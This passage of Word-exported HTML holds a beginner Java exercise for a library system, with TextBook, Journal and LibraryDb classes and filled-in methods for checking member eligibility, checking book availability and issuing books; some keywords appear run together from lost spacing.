Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//TextBook Class<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">classTextBook extends Book {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private String sAuthor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">privateintiEdition;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">TextBook(String sTitle, String\r\nsPublisher,StringsAuthor, intiEdition)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">super(sTitle,sPublisher);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.sAuthor\r\n= sAuthor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">this.iEdition\r\n= iEdition;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">public String getsAuthor() {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returnsAuthor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">publicintgetiEdition() {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returniEdition;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//Journal Class<o:p></o:p></span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">class Journal extends Book {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private String sEditor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">privateintiVolume;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">privateintiIssue;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">Journal(String sTitle, String\r\nsPublisher,StringsEditor, intiVolume, intiIssue)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;super(sTitle,sPublisher);<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;this.sEditor\r\n=sEditor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; this.iVolume\r\n= iVolume;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; this.iIssue\r\n= iIssue;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public String getsEditor() {</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; returnsEditor;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">publicintgetiVolume() {</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; returniVolume;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">publicintgetiIssue() {</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;returniIssue;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><b><u><span style=\"font-size:12.0pt;\r\nline-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;color:black;mso-themecolor:\r\ntext1\">//LibraryDB class</span></u></b></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">classLibraryDb {<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private static int[] Members =\r\n{2001,2002,2003,2004,2005};<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private static int[] BooksTaken =\r\n{3,5,2,3,5};<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private static int[] Books =\r\n{1001,1002,1003,1004,1005};<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">private static int[] BookStatus =\r\n{1,1,0,1,0};<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public static intvalidateMemberEligiblity(intiMemberId)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">//write your code\r\nhere</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp;for\r\n(intiCount = 0; iCount&lt;5; iCount++)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; if(Members[iCount]\r\n== iMemberId)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; {</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; if(BooksTaken[iCount]==5)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; &nbsp;return\r\n0;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;else<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; return\r\n1;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; }<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; }</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp;&nbsp;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; }<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; &nbsp;return\r\n0;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public static\r\nintvalidateBookAvailability(intiBookId)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">//write your code\r\nhere</span><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; for\r\n(intiCount = 0; iCount&lt;5; iCount++)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">if(Books[iCount]\r\n== iBookId)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">if(BookStatus[iCount]==0)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{</span></p><p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">return\r\n0;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;else<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;return\r\n1;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;return\r\n0;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;&nbsp;</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">public static void issueBook(intiMemberId,\r\nintiBookId)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:gray;mso-themecolor:background1;mso-themeshade:128\">//write your code\r\nhere</span><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\"><o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;for\r\n(intiCount = 0; iCount&lt;5; iCount++)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; if(Members[iCount]\r\n== iMemberId)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;{</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;BooksTaken[iCount]\r\n+=1;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;}</span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">&nbsp; &nbsp;</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; </span><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">for\r\n(intiCount = 0; iCount&lt;5; iCount++)</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp; if(Books[iCount]\r\n== iBookId)<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;{<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">&nbsp; &nbsp;BookStatus[iCount]\r\n= 0;<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"font-size:12.0pt;line-height:150%;font-family:&quot;Times New Roman&quot;,&quot;serif&quot;;\r\ncolor:black;mso-themecolor:text1\">}<o:p></o:p></span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 150%;\"><span style=\"color: black; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt;\">}</span></p>\r\n\r\n<p class=\"MsoNormal\" style=\"text-align: left; line-height: 